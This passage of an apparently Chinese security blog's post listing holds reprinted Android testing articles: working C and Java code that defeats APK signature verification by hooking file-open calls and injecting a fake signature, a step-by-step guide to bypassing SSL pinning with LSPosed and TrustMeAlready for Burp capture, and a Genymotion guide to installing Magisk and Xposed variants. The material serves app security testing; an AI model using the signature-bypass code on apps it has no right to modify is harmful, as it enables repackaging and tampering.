class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span> &#123;</span><br><span class="line">    <span class="comment">//XH_LOG_ERROR(&quot;open: %s&quot;, pathname);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(pathname, apkPath__) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//XH_LOG_ERROR(&quot;replace -&gt; %s&quot;, repPath__);</span></span><br><span class="line">        <span class="keyword">return</span> old_open(repPath__, flags, mode);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> old_open(pathname, flags, mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT <span class="type">void</span> JNICALL</span><br><span class="line"><span class="title function_">Java_bin_mt_signature_KillerApplication_hookApkPath</span><span class="params">(JNIEnv *env, __attribute__((unused)) jclass clazz, jstring apkPath, jstring repPath)</span> &#123;</span><br><span class="line">    apkPath__ = (*env)-&gt;GetStringUTFChars(env, apkPath, <span class="number">0</span>);</span><br><span class="line">    repPath__ = (*env)-&gt;GetStringUTFChars(env, repPath, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    xhook_register(<span class="string">&quot;.*\\.so$&quot;</span>, <span class="string">&quot;openat64&quot;</span>, openat64Impl, (<span class="type">void</span> **) &amp;old_openat64);</span><br><span class="line">    xhook_register(<span class="string">&quot;.*\\.so$&quot;</span>, <span class="string">&quot;openat&quot;</span>, openatImpl, (<span class="type">void</span> **) &amp;old_openat);</span><br><span class="line">    xhook_register(<span class="string">&quot;.*\\.so$&quot;</span>, <span class="string">&quot;open64&quot;</span>, open64Impl, (<span class="type">void</span> **) &amp;old_open64);</span><br><span class="line">    xhook_register(<span class="string">&quot;.*\\.so$&quot;</span>, <span class="string">&quot;open&quot;</span>, openImpl, (<span class="type">void</span> **) &amp;old_open);</span><br><span class="line"></span><br><span class="line">    xhook_refresh(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过Hook open函数，可以把基于APK读取的签名方式给绕过。</p>
<p>下面提供一个绕过基于PackageManager的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">killPM</span><span class="params">(String packageName, String signatureData)</span> &#123;</span><br><span class="line">    <span class="comment">// 构造一个假的签名</span></span><br><span class="line">    <span class="type">Signature</span> <span class="variable">fakeSignature</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Signature</span>(Base64.decode(signatureData, Base64.DEFAULT));</span><br><span class="line">    Parcelable.Creator&lt;PackageInfo&gt; originalCreator = PackageInfo.CREATOR;</span><br><span class="line">    Parcelable.Creator&lt;PackageInfo&gt; creator = <span class="keyword">new</span> <span class="title class_">Parcelable</span>.Creator&lt;PackageInfo&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PackageInfo <span class="title function_">createFromParcel</span><span class="params">(Parcel source)</span> &#123;</span><br><span class="line">            <span class="type">PackageInfo</span> <span class="variable">packageInfo</span> <span class="operator">=</span> originalCreator.createFromParcel(source);</span><br><span class="line">            <span class="keyword">if</span> (packageInfo.packageName.equals(packageName)) &#123; <span class="comment">//</span></span><br><span class="line">                <span class="keyword">if</span> (packageInfo.signatures != <span class="literal">null</span> &amp;&amp; packageInfo.signatures.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    packageInfo.signatures[<span class="number">0</span>] = fakeSignature; <span class="comment">// 将虚假的签名放入packageInfo，取代原来的</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (packageInfo.signingInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">                        Signature[] signaturesArray = packageInfo.signingInfo.getApkContentsSigners();</span><br><span class="line">                        <span class="keyword">if</span> (signaturesArray != <span class="literal">null</span> &amp;&amp; signaturesArray.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            signaturesArray[<span class="number">0</span>] = fakeSignature;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> packageInfo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PackageInfo[] newArray(<span class="type">int</span> size) &#123;</span><br><span class="line">            <span class="keyword">return</span> originalCreator.newArray(size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 用假的creator替换原来的PackageInfo.CREATOR</span></span><br><span class="line">        findField(PackageInfo.class, <span class="string">&quot;CREATOR&quot;</span>).set(<span class="literal">null</span>, creator);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P) &#123;</span><br><span class="line">        <span class="comment">// 解除某些Android系统API的使用限制？</span></span><br><span class="line">        HiddenApiBypass.addHiddenApiExemptions(<span class="string">&quot;Landroid/os/Parcel;&quot;</span>, <span class="string">&quot;Landroid/content/pm&quot;</span>, <span class="string">&quot;Landroid/app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 清空签名缓存</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">cache</span> <span class="operator">=</span> findField(PackageManager.class, <span class="string">&quot;sPackageInfoCache&quot;</span>).get(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// noinspection ConstantConditions</span></span><br><span class="line">        cache.getClass().getMethod(<span class="string">&quot;clear&quot;</span>).invoke(cache);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 清空签名缓存</span></span><br><span class="line">        Map&lt;?, ?&gt; mCreators = (Map&lt;?, ?&gt;) findField(Parcel.class, <span class="string">&quot;mCreators&quot;</span>).get(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// noinspection ConstantConditions</span></span><br><span class="line">        mCreators.clear();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 清空签名缓存</span></span><br><span class="line">        Map&lt;?, ?&gt; sPairedCreators = (Map&lt;?, ?&gt;) findField(Parcel.class, <span class="string">&quot;sPairedCreators&quot;</span>).get(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// noinspection ConstantConditions</span></span><br><span class="line">        sPairedCreators.clear();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="参考">参考</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuyongyin/archive/2023/01/15/17005314.html">Java Keytool 介绍 - 且行且码 - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d00e9754df43">获取Android应用签名的几种方式 - 简书 (jianshu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b28a5be05029">Android studio 如何生成jks签名文件 - 简书 (jianshu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36270253/article/details/114007681">apktool重新打包时报错_apktool 忽略错误信息__y4nnl2的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q610098308/article/details/105138228">Android之通过 apksigner 对 apk 进行 手动签名_恋恋西风的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://developer.android.google.cn/studio/command-line/apksigner?hl=zh-cn">apksigner | Android 开发者 | Android Developers (google.cn)</a></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Signature/" rel="tag">Signature</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/22/LSPosed-SSL/">
                APP 测试 - LSPosed 绕过 SSL 证书抓包
            </a>
        </h2>
    
    <time>
        Jan 22, 2024
    </time>
    <section class="content">
        <h1><span id="app-测试-lsposed-绕过-ssl-证书抓包">APP 测试 - LSPosed 绕过 SSL 证书抓包</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="http://www.luckysec.cn/posts/279f59b.html">LuckySec</a> 并作补充</p>
</blockquote>
<h2><span id="前言">前言</span></h2><blockquote>
<p>前面介绍了通过<a target="_blank" rel="noopener" href="http://www.luckysec.cn/posts/98df6d1a.html">《VirtualXposed 绕过 SSL 证书抓包》</a>，这个方法有些局限性，比如不能在电脑上的《夜神模拟器》、《雷电模拟器》运行，需要一部测试手机等因素，对于部分人来说可能不太方便，还是更喜欢都在电脑上完成这系列操作，可以尝试用 LSPosed 绕过 SSL 证书抓包。</p>
</blockquote>
<h2><span id="0x01-工具简介">0x01 工具简介</span></h2><blockquote>
<p>LSPosed 是一个基于 Riru&#x2F;Zygisk 的 ART Hook 框架，该框架利用 LSPlant 挂钩框架提供与 OG Xposed 一致的 API, 支持 Android 8.1 ~ 13。</p>
<p>Xposed 是一个模块框架，可以在不接触任何 APK 的情况下改变系统和应用程序的行为。利用 Xposed 的 TrustMeAlready 模块插件，可以防止软件检测抓包，绕过大部分 ssl-pinning，保证 APP 抓包的可续性能。</p>
</blockquote>
<h2><span id="0x02-下载安装">0x02 下载安装</span></h2><blockquote>
<p>特别提示：在安装之前需要注意以下几点：</p>
<ul>
<li>LSPosed 项目地址：<a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed/releases">https://github.com/LSPosed/LSPosed/releases</a></li>
<li>TrustMeAlready 项目地址：<a target="_blank" rel="noopener" href="https://github.com/ViRb3/TrustMeAlready/releases">https://github.com/ViRb3/TrustMeAlready/releases</a></li>
<li>系统： Android 8.1 ~ 13</li>
<li>安装 Magisk v23+ (Riru) &#x2F; v24+ (Zygisk)</li>
<li>（针对 Riru 风格）从 Magisk 库安装Riru v25+</li>
<li>在 Magisk 应用程序中下载并安装LSPosed</li>
<li>重启</li>
</ul>
</blockquote>
<h2><span id="0x03-抓包教程">0x03 抓包教程</span></h2><blockquote>
<p>注意：如果用雷电模拟器请使用 9.0.19 或之前的版本，避免不必要的问题发生。</p>
<p>以夜神模拟器为例，添加并运行一个 Android 9 的虚拟机。</p>
<p><img src="/2024/01/22/LSPosed-SSL/1.png" alt="image"></p>
<p>在模拟器设置里将虚拟机设置为网络桥接模式、开启 ROOT（默认开启），设置好后重启虚拟机。</p>
<p><img src="/2024/01/22/LSPosed-SSL/2.png" alt="image"></p>
<p>在夜神模拟器虚拟机里安装 <code>Magisk.apk</code>、<code>Magisk Terminal Emulato.apk</code>、<code>app-debug.apk</code>（安装成功不显示在主界面）、<code>LSPosed-manager.apk</code>。</p>
<p><img src="/2024/01/22/LSPosed-SSL/3.png" alt="image"></p>
<p>打开 <code>Magisk Terminal Emulator.apk</code>，按照如下步骤操作：输入 m 按回车 &gt; 再输入 y 按回车 &gt; 超级用户授权允许 &gt; 再输入 1 按回车 &gt; 输入 a 按回车 &gt; 再输入 1 按回车 &gt; 完毕。</p>
<p><img src="/2024/01/22/LSPosed-SSL/4.png" alt="image"></p>
<p>上述步骤完成后，重启模拟器，打开 <code>Magisk.apk</code> 可以发现 Magisk 安装成功。</p>
<p><img src="/2024/01/22/LSPosed-SSL/5.png" alt="image"></p>
<p>打开 <code>Magisk.apk</code> &gt; 点击右上角齿轮按钮 &gt; 界面往下滑动，找到 Zygisk 选项打开并重启模拟器虚拟机。</p>
<p><img src="/2024/01/22/LSPosed-SSL/6.png" alt="image"></p>
<p>接着将 <code>LSPosed-v1.8.6-6712-zygisk-release.zip</code> 复制到模拟器文件夹里面。打开 <code>Magisk.apk</code> &gt; 底部模块选项 &gt; 从本地安装 &gt; 选择模拟器文件夹内的 <code>LSPosed-v1.8.6-6712-zygisk-release.zip</code> 卡刷包。</p>
<p><img src="/2024/01/22/LSPosed-SSL/7.png" alt="image"></p>
<p>重启模拟器虚拟机后，打开 <code>LSPosed-manager.apk</code>，可以发现 LSPosed 安装成功了。</p>
<p><img src="/2024/01/22/LSPosed-SSL/8.png" alt="image"></p>
<p>然后在夜神模拟器虚拟机里安装 <code>TrustMeAlready-v1.11.apk</code>，安装这个 apk 主界面图标可能会卡在安装的动画，不必在意，忽略即可。</p>
<p><img src="/2024/01/22/LSPosed-SSL/9.png" alt="image"></p>
<p>接着打开 <code>LSPosed-manager.apk</code> 的底部模块选项，点击 TrustMeAlready，启动模块，选择要测试的 APP。</p>
<p><img src="/2024/01/22/LSPosed-SSL/10.png" alt="image"></p>
<p>使用 BurpSuite 工具开启代理抓包，设置监听地址为同一局域网 IP 地址，端口自定义，不与电脑其他端口冲突使用即可。</p>
<p><img src="/2024/01/22/LSPosed-SSL/11.png" alt="image"></p>
<p>在夜神模拟器手机系统设置中将 WiFi 的代理设置为 BurpSuite 监听器的地址。</p>
<p><img src="/2024/01/22/LSPosed-SSL/12.png" alt="image"></p>
<p>最后，打开要测试的 APP，刷新功能页面，在 BurpSuite 中即可看到抓取的 HTTP&#x2F;HTTPS 网络数据包。</p>
<p><img src="/2024/01/22/LSPosed-SSL/13.png" alt="image"></p>
</blockquote>
<h2><span id="参考文章">参考文章</span></h2><blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1688786">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1688786</a></li>
</ul>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/LSPosed/" rel="tag">LSPosed</a><a class="tag-none-link" href="/tags/Magisk/" rel="tag">Magisk</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSL/" rel="tag">SSL</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/">
                How to install Xposed/EdXposed/LSPosed + Magisk with Genymotion Desktop?
            </a>
        </h2>
    
    <time>
        Jan 22, 2024
    </time>
    <section class="content">
        <h1><span id="how-to-install-xposedx2fedxposedx2flsposed-magisk-with-genymotion-desktop">How to install Xposed&#x2F;EdXposed&#x2F;LSPosed + Magisk with Genymotion Desktop?</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://support.genymotion.com/hc/en-us/articles/360010853198-How-to-install-Xposed-EdXposed-LSPosed-Magisk-with-Genymotion-Desktop-">Genymotion Help Center</a> 并作补充</p>
<p><strong>Warning</strong></p>
<p>GENYMOBILE assumes no liability whatsoever resulting from the download, install and use of Xposed, EdXposed, LSPosed and Magisk. <strong>Use at your own risk.</strong></p>
<p><strong>Note</strong></p>
<p>Because Xposed and EdXposed are no longer maintained, we strongly recommend not using them anymore.</p>
</blockquote>
<h2><span id="android-50-71">Android 5.0 - 7.1</span></h2><h3><span id="prerequisites">Prerequisites</span></h3><blockquote>
<ul>
<li><em>Xposed framework</em></li>
<li><em>Xposed installer</em></li>
</ul>
</blockquote>
<h3><span id="installation">Installation</span></h3><blockquote>
<ol>
<li>Drag’n drop the Xposed framework zip file (<code>xposed-vXX-sdkXX-x86.zip</code>) to your virtual device display to flash the device.</li>
<li>Drag’n drop Xposed Installer APK (<code>XposedInstaller_*.apk</code>). This should install and launch <em>Xposed Installer</em> application. At this stage, it will display that the Xposed framework is installed but disabled:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/1.png" alt="image"></p>
<ol start="3">
<li><p>Reboot the device with <code>adb reboot</code> command. <strong>Do not reboot from *Xposed Installer* as this will freeze the device.</strong></p>
</li>
<li><p>Launch <em>Xposed installer</em>. It should display “Xposed Framework version XX is active”:</p>
</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/2.png" alt="image"></p>
</blockquote>
<h2><span id="android-80">Android 8.0</span></h2><blockquote>
<p>Xposed only works with Android 5.0 to 7.1. For Android 8.0, you need to use Magisk + Edxposed instead.</p>
</blockquote>
<h3><span id="prerequisites">Prerequisites</span></h3><blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1Os1feAWtJSVqqs25XIFMyx5oQU-nAhjl/view?usp=sharing">Magisk Manager (Magisk-v23.0.apk)</a> </li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/17N5-c67849_3Z8t656zy9hyVDR449sE5/view?usp=sharing">Magisk framework for x86</a></li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1Z46V2oMVRgfL-FAGCCHr-_X4vil6ZZie/view?usp=sharing">Riru Magisk module v.25.4.4</a></li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1611qJFjSkjZl02Ujmr8hzuKaYnT0W6mb/view?usp=sharing">Edxposed Manager 4.6.2</a></li>
</ul>
</blockquote>
<h3><span id="installation">Installation</span></h3><h4><span id="step-1-install-magisk">Step 1: Install Magisk</span></h4><blockquote>
<ol>
<li>Drag’n Drop Magisk Manager apk: <code>Magisk-v23.0.apk</code>. Magisk Manager will install and open. <em>Close it for now.</em></li>
<li>Drag’n Drop <code>Magisk_rebuilt_1c8ebfac_x86.zip</code> and flash it.</li>
<li>When flashing is complete, reboot the device.</li>
<li>Launch Magisk Manager. It will request ROOT access, select “Remember choice forever” and click Allow:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/3.png" alt="image"></p>
<p>It is possible that the popup opens in the background and is covered by Magisk Manager main window. If so press <strong>back</strong> to access the popup and allow ROOT:</p>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/4.gif" alt="image"></p>
<ol start="5">
<li>You will then be prompted with an update to apply, accept it:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/5.png" alt="image"></p>
<ol start="6">
<li>The device will reboot one more time. Launch Magisk Manager again, you should now be informed that Magisk is now installed in 1c8ebfac(23015) version:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/6.png" alt="image"></p>
</blockquote>
<h4><span id="step-2-install-riru">Step 2: Install Riru</span></h4><blockquote>
<p><strong>Important</strong></p>
<p>Do not install the Riru version available in the Magisk Manager app. Use the old Riru v25 version provided in this article (see prerequisite).</p>
<ol>
<li>Drag’n drop the Riru archive onto the instance display: <code>riru-v25.4.4-release.zip</code>. <strong>Do not flash it!</strong> The archive must be installed from Magisk Manager.</li>
<li>Launch Magisk Manager app and click on the last icon in the bottom toolbar to go to the module section:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/7.png" alt="image"></p>
<ol start="3">
<li>Click “install from storage”:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/8.png" alt="image"></p>
<ol start="4">
<li>Go to the <em>Download</em> folder from the menu:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/9.png" alt="image"></p>
<ol start="5">
<li>Select the Riru archive, <code>riru-v25.4.4-release.zip</code></li>
<li>Reboot the device</li>
</ol>
<p>Riru version 25 should now be present in the installed modules list in Magisk Manager:</p>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/10.png" alt="image"></p>
<p><strong>Important</strong></p>
<p>Make sure NOT to update to Riru v26 as it does not work with EdXposed right now.</p>
</blockquote>
<h4><span id="step-3-install-edxposed">Step 3: Install EdXposed</span></h4><blockquote>
<ol>
<li>You can install EdXposed framework from Magisk Manager. Go to Magisk Manager module manager:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/11.png" alt="image"></p>
<ol start="2">
<li>Open the search widget and input “Edxposed”. Select <strong>Riru - EdXposed</strong>:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/12.png" alt="image"></p>
<ol start="3">
<li>Install the module:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/13.png" alt="image"></p>
<ol start="4">
<li><p>Reboot the device.</p>
</li>
<li><p>Drag’n drop <em>Edxposed manager</em> APK file (<code>EdXposedManager-4.5.7-45700-org.meowcat.edxposed.manager-release.apk</code>) to the device display.</p>
</li>
<li><p>Reboot the device</p>
</li>
</ol>
<p><em>Edxposed manager</em> should launch and display “Edxposed framework is active”:</p>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/14.png" alt="image"></p>
</blockquote>
<h2><span id="android-81-and-above">Android 8.1 and above</span></h2><blockquote>
<p>Edxposed and Xposed are no longer maintained and there are no builds for Android 12 and above.</p>
<p>Instead, we will use LSPosed and Magisk for Android 8.1 and above.</p>
</blockquote>
<h3><span id="prerequisite">Prerequisite</span></h3><blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1Os1feAWtJSVqqs25XIFMyx5oQU-nAhjl/view?usp=sharing">Magisk Manager APK (v23.0)</a> </li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/17N5-c67849_3Z8t656zy9hyVDR449sE5/view?usp=sharing">Magisk framework for x86</a> for Android 8.1 - 10</li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1OF8zx6p46t8BcKuO5A6Ncq46zLpFfps-/view?usp=sharing">Magisk framework for x86_64</a> for Android 11 and above (PC or Mac Intel)</li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/14bxIDmOyBKhfeFJfWOWgJNrJ7vDvsUjL/view?usp=sharing">Magisk framework for arm64</a> for mac M1&#x2F;M2</li>
<li><a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed/releases/download/v1.8.6/LSPosed-v1.8.6-6712-riru-release.zip">LSPosed archive</a></li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1OdIoajzfRbDQsniGcPe0Ozvgl3coB_0n/view?usp=drive_link">LSPosed manager APK</a></li>
</ul>
</blockquote>
<h3><span id="installation">Installation</span></h3><h4><span id="step-1-install-magisk">Step 1: Install Magisk</span></h4><blockquote>
<ol>
<li>Drag’n Drop Magisk Manager apk: <code>Magisk-v23.0.apk</code>. Magisk Manager will install and open. <em>Close it for now.</em></li>
<li>Drag’n Drop the flashable archive:<ul>
<li><code>Magisk_rebuilt_1c8ebfac_x86.zip</code> if you use Android 8.1 - 10</li>
<li><code>Magisk_rebuilt_1c8ebfac_x86_64.zip</code> if you use Android 11 and above on a PC or an old Mac Intel</li>
<li><code>Magisk_rebuilt_1c8ebfac_arm64.zip</code> if you use a mac M1&#x2F;M2</li>
</ul>
</li>
<li>When flashing is complete, reboot the device.</li>
<li>Launch Magisk Manager. It will request ROOT access, select “Remember choice forever” and click Allow:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/15.png" alt="image"></p>
<p>It is possible that the popup opens in the background and is covered by Magisk Manager main window. If so press <strong>back</strong> to access the popup and allow ROOT:</p>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/16.gif" alt="image"></p>
<ol start="5">
<li>You will then be prompted with an update to apply, accept it:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/17.png" alt="image"></p>
<ol start="6">
<li>The device will reboot one more time. Launch Magisk Manager again, you should now be informed that Magisk is now installed in 1c8ebfac(23015) version:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/18.png" alt="image"></p>
</blockquote>
<h4><span id="step-2-install-riru">Step 2: Install Riru</span></h4><blockquote>
<p><strong>Important</strong></p>
<p>Do not install the Riru version available in the Magisk Manager app. Use the old Riru v25 version provided in this article (see prerequisite).</p>
<ol>
<li>Drag’n drop the Riru archive onto the instance display: <code>riru-v25.4.4-release.zip</code>. <strong>The flashing process will fail, but this is normal.</strong> The archive must be installed from Magisk Manager.</li>
<li>Launch Magisk Manager app and click on the last icon in the bottom toolbar to go to the module section:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/19.png" alt="image"></p>
<ol start="3">
<li>Click “install from storage”:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/20.png" alt="image"></p>
<ol start="4">
<li>Go to the <em>Download</em> folder from the menu:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/21.png" alt="image"></p>
<ol start="5">
<li><p>Select the Riru archive, <code>riru-v25.4.4-release.zip</code></p>
</li>
<li><p>Reboot the device</p>
</li>
</ol>
<p>Riru version 25 should now be present in the installed modules list in Magisk Manager:</p>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/22.png" alt="image"></p>
</blockquote>
<h4><span id="step-3-install-riru-lsposed">Step 3: Install Riru - LSPosed</span></h4><blockquote>
<ol>
<li>Drag and drop the <a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed/releases/download/v1.8.6/LSPosed-v1.8.6-6712-riru-release.zip">LSPosed archive</a> to the device. <strong>Do not flash it!</strong></li>
<li>Open Magisk Manager, go to the plugin manager page:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/23.png" alt="image"></p>
<ol start="3">
<li>click <em>Install from storage</em> and select <code>LSPosed-v1.8.6-6712-riru-release.zip</code>:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/24.png" alt="image"></p>
<ol start="4">
<li><p>Reboot the device when prompted</p>
</li>
<li><p>Drag’n Drop <code>LSPosed_manager.apk</code>, LSPosed manager should open:</p>
</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/25.png" alt="image"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/EdXposed/" rel="tag">EdXposed</a><a class="tag-none-link" href="/tags/Genymotion/" rel="tag">Genymotion</a><a class="tag-none-link" href="/tags/LSPosed/" rel="tag">LSPosed</a><a class="tag-none-link" href="/tags/Magisk/" rel="tag">Magisk</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Xposed/" rel="tag">Xposed</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/22/Android-Internet-Redirect/">
                Android App安全之Intent重定向详解
            </a>
        </h2>
    
    <time>
        Jan 22, 2024
    </time>
    <section class="content">
        <h1><span id="android-app安全之intent重定向详解">Android App安全之Intent重定向详解</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/endpoint/271629.html">OPPO安珀实验室</a> 并作补充</p>
</blockquote>
